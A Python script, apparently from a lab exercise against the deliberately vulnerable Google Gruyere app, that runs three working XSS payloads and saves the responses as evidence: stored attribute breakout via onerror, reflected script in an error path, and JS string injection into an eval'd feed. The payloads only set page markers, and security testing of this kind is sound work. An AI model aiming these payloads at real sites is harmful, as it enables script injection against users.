#!/usr/bin/env python3
"""Round 5 — XSS 3종 마무리 (CDP 실행증거 포함).

(a) 저장형: 프로필 icon 속성 탈출 — home.gtl/snippets.gtl 의 src='{{icon:text}}' 에서
    cgi.escape(quote 미지정)가 따옴표를 이스케이프하지 않음 → 작은따옴표로 속성 탈출.
(b) 반사형: 잘못된 경로가 error.gtl 의 <div class='message'> 에 미이스케이프 반사.
(c) 반사형(AJAX): feed.gtl 의 uid 가 JS 문자열에 미이스케이프 삽입 → lib.js 가 eval().

모든 상태변경은 내 테스트 계정(brie) 프로필에 한정.
"""
from __future__ import annotations

import re
import subprocess
import urllib.parse
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
SCRATCH = ROOT / "scratch"
EVIDENCE = ROOT / "evidence"
GID = (SCRATCH / "gid.txt").read_text().strip().split("=", 1)[1]
BASE = f"https://google-gruyere.appspot.com/{GID}"
JAR = SCRATCH / "gruyere.cookies"
CA = "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"

ICON_PAYLOAD = (
    "x' onerror='var d=document.createElement(\"div\");d.id=\"icon-xss\";"
    "d.textContent=\"ICON-XSS\";document.body.appendChild(d)'"
)
PATH_PAYLOAD = "/x<script>document.title='PATH-XSS'</script>"
FEED_PAYLOAD = "x\"] , document.title='FEED-XSS' , [\"y"


def fetch(path: str, auth: bool = True) -> str:
    cmd = ["curl", "-s", "--path-as-is", "--max-time", "30",
           "-x", "http://127.0.0.1:8080", "--cacert", CA]
    if auth:
        cmd += ["-b", str(JAR), "-c", str(JAR)]
    cmd.append(BASE + path)
    return subprocess.run(cmd, capture_output=True, text=True).stdout


def main() -> None:
    rep: list[str] = []
    rep.append(f"GID={GID}")
    rep.append(f"BASE={BASE}\n")

    # ---------- (a) icon 속성 저장형 XSS ----------
    rep.append("=" * 72)
    rep.append("(a) 저장형 XSS — 프로필 icon 속성 탈출")
    rep.append("=" * 72)
    fetch("/login?uid=brie&pw=briebrie")
    before = fetch("/dump.gtl")
    m = re.search(r"'icon':\s*([^,\n}]*)", before)
    rep.append(f"  변경 전 brie.icon = {m.group(1).strip() if m else '(필드 없음)'}")

    q = ("/saveprofile?action=update&uid=brie&name=Brie&icon="
         + urllib.parse.quote(ICON_PAYLOAD, safe=""))
    rep.append(f"  요청: GET /saveprofile?action=update&uid=brie&name=Brie&icon={ICON_PAYLOAD}")
    fetch(q)
    after = fetch("/dump.gtl")
    m2 = re.search(r"'icon':\s*'([^']*)'", after)
    rep.append(f"  변경 후 brie.icon = {m2.group(1) if m2 else '(확인 실패)'}")

    home = fetch("/", auth=False)
    snips = fetch("/snippets.gtl?uid=brie", auth=False)
    (EVIDENCE / "round5_icon_unauth_home.html").write_text(home, encoding="utf-8", errors="replace")
    (EVIDENCE / "round5_icon_unauth_snippets.html").write_text(snips, encoding="utf-8", errors="replace")
    for label, html in (("홈(/)", home), ("/snippets.gtl?uid=brie", snips)):
        for tag in re.findall(r"<img[^>]*>", html):
            if "onerror" in tag:
                rep.append(f"  [{label}] 렌더된 img 태그 원문: {tag}")
    rep.append(f"  비인증 홈에 onerror 노출: {'onerror' in home}")

    # ---------- (b) 경로 반사형 XSS ----------
    rep.append("\n" + "=" * 72)
    rep.append("(b) 반사형 XSS — 잘못된 경로 반사")
    rep.append("=" * 72)
    enc_path = "/" + urllib.parse.quote(PATH_PAYLOAD.lstrip("/"), safe="/")
    body = fetch(enc_path, auth=False)
    mm = re.search(r"<div class='message'>(.*?)</div>", body, re.S)
    rep.append(f"  요청 경로(인코딩): {enc_path}")
    rep.append(f"  반사된 메시지: {mm.group(1).strip() if mm else '(없음)'}")
    rep.append(f"  script 태그가 그대로 반사됨: {'<script>' in body}")
    (EVIDENCE / "round5_path_reflection.html").write_text(body, encoding="utf-8", errors="replace")

    # ---------- (c) feed.gtl AJAX 반사 JS 인젝션 ----------
    rep.append("\n" + "=" * 72)
    rep.append("(c) 반사형(AJAX) — feed.gtl?uid= JS 문자열 인젝션")
    rep.append("=" * 72)
    feed = fetch("/feed.gtl?uid=" + urllib.parse.quote(FEED_PAYLOAD, safe=""), auth=False)
    rep.append(f"  페이로드: {FEED_PAYLOAD}")
    rep.append(f"  응답 원문:\n{feed}")
    (EVIDENCE / "round5_feed_injection.txt").write_text(feed, encoding="utf-8", errors="replace")

    out = "\n".join(rep)
    (EVIDENCE / "round5_xss_vectors.txt").write_text(out, encoding="utf-8")
    print(out)


if __name__ == "__main__":
    main()
